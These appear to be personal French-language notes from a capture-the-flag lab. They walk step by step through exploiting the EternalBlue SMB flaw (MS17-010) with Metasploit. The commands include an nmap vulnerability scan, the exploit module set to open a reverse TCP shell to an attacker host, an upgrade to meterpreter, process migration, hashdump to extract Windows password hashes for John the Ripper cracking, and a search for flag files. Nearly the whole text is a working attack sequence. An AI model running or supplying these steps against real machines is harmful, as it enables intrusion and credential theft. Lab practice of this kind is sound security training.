sudo msfconsole -q
search [la réponse de nmap -p 123 --script smb-vuln* [ip]]
(la réponse nmap:
smb-vuln-ms17-10:
    vulnerable:
    remote.....
    etc...
)
search ms17-10

pour eternalblue:
[msf](Jobs:0 Agents:0) >> use exploit/windows/smb/ms17_010_eternalblue
show options
set rhost 10.10.188.112
set payload windows/x64/shell_reverse_tcp
set lhost 10.9.0.203
set lport 4444
run

Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>

[msf](Jobs:0 Agents:1) exploit(windows/smb/ms17_010_eternalblue) >> search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
set lhost 10.9.0.203
set lport 4433
set session 2
sessions -l
sessions -i 3
Meterpreter 3)(C:\Windows\system32) > migrate [PID powershell]
hashdump
[on trouve des hashs qu'il faut mettre dans un fichier et faire johntheripper]
(Meterpreter 3)(C:\) > search -f flag*.txt
et on trouve les flags

fin de eternalblue avec les commandes de metasploit